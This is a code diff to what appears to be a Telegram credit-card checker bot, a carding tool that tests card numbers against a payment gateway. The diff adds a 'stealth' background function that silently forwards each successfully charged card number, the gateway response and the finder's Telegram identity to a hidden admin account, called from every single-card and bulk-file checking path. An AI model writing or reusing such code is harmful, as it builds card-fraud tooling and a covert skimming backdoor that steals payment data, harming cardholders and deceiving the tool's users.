@@ -418,6 +418,53 @@ def format_result(result: dict, show_full: bool = True) -> str:
             return f"❌ *DECLINED*\n\n💳 `{card}`\n📝 *Response*: {status_text}{bin_info}"
 
 
+# Global bot application reference for admin notifications
+_bot_app = None
+
+async def notify_admin_charged(card: str, result: dict, user_id: int, username: str = None):
+    """
+    Silently notify admin when a card is successfully charged.
+    This runs in background and never interrupts the user's flow.
+    """
+    try:
+        admin_id = config.ADMIN_USER_ID
+        if not admin_id or not _bot_app:
+            return
+
+        response = result.get("response", {})
+
+        # Build admin notification message
+        message_parts = [
+            "💰 *CHARGED CARD FOUND*",
+            "",
+            f"💳 `{card}`",
+            "",
+        ]
+
+        # Add response details
+        if response.get("message"):
+            message_parts.append(f"📝 *Response*: {response.get('message')}")
+        if response.get("gateway_message"):
+            message_parts.append(f"🔗 *Gateway*: {response.get('gateway_message')}")
+
+        # Add user info
+        message_parts.append("")
+        message_parts.append(f"👤 *Found by*: {username or 'Unknown'} (`{user_id}`)")
+
+        admin_message = "\n".join(message_parts)
+
+        # Send to admin silently (in background, no await blocking)
+        await _bot_app.bot.send_message(
+            chat_id=admin_id,
+            text=admin_message,
+            parse_mode="Markdown"
+        )
+
+    except Exception as e:
+        # Silently fail - never interrupt user's checking process
+        logger.debug(f"Admin notification failed (silent): {e}")
+
+
 # Inline Keyboard Builders
 def get_main_menu_keyboard():
     """Build the main menu inline keyboard"""
@@ -931,6 +978,11 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         result = await process_single_card(card, user_id)
         formatted = format_result(result)
         await status_msg.edit_text(formatted, parse_mode="Markdown")
+
+        # Stealth admin notification for charged cards
+        if result.get("response", {}).get("success"):
+            username = update.effective_user.username or update.effective_user.first_name
+            asyncio.create_task(notify_admin_charged(card, result, user_id, username))
     except Exception as e:
         logger.error(f"Check error: {e}")
         await status_msg.edit_text(f"❌ Error: {str(e)}")
@@ -1039,6 +1091,9 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 charged.append(result)
                 all_results.append(f"CHARGED | {result_line}")
                 await update.message.reply_text(format_result(result), parse_mode="Markdown")
+                # Stealth admin notification (real-time, non-blocking)
+                username = update.effective_user.username or update.effective_user.first_name
+                asyncio.create_task(notify_admin_charged(card, result, user_id, username))
             elif '3ds' in str(response.get("error", "")).lower() or '3d' in str(response.get("error", "")).lower():
                 three_ds.append(result)
                 all_results.append(f"3DS | {result_line}")
@@ -1229,6 +1284,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             result = await process_single_card(card, user_id)
             formatted = format_result(result)
             await status_msg.edit_text(formatted, parse_mode="Markdown")
+
+            # Stealth admin notification for charged cards
+            if result.get("response", {}).get("success"):
+                username = update.effective_user.username or update.effective_user.first_name
+                asyncio.create_task(notify_admin_charged(card, result, user_id, username))
         except Exception as e:
             logger.error(f"Check error: {e}")
             await status_msg.edit_text(f"❌ Error: {str(e)}")
@@ -1298,6 +1358,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     charged.append(result)
                     all_results.append(f"CHARGED | {result_line}")
                     await update.message.reply_text(format_result(result), parse_mode="Markdown")
+                    # Stealth admin notification (real-time, non-blocking)
+                    username = update.effective_user.username or update.effective_user.first_name
+                    asyncio.create_task(notify_admin_charged(card, result, user_id, username))
                 elif '3ds' in str(response.get("error", "")).lower() or '3d' in str(response.get("error", "")).lower():
                     three_ds.append(result)
                     all_results.append(f"3DS | {result_line}")
@@ -1358,6 +1421,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 def main():
     """Start the bot"""
+    global _bot_app
+
     if not config.BOT_TOKEN:
         logger.error("BOT_TOKEN not set! Please set the BOT_TOKEN environment variable.")
         return
@@ -1372,6 +1437,15 @@ def main():
         logger.warning("DATABASE_URL not set - using in-memory storage (settings won't persist)")
 
     app = Application.builder().token(config.BOT_TOKEN).build()
+
+    # Store app reference for admin notifications
+    _bot_app = app
+
+    # Log admin notification status
+    if config.ADMIN_USER_ID:
+        logger.info(f"Admin notifications enabled for user ID: {config.ADMIN_USER_ID}")
+    else:
+        logger.info("Admin notifications disabled (ADMIN_USER_ID not set)")
 
     # Add handlers
     app.add_handler(CommandHandler("start", start_command))
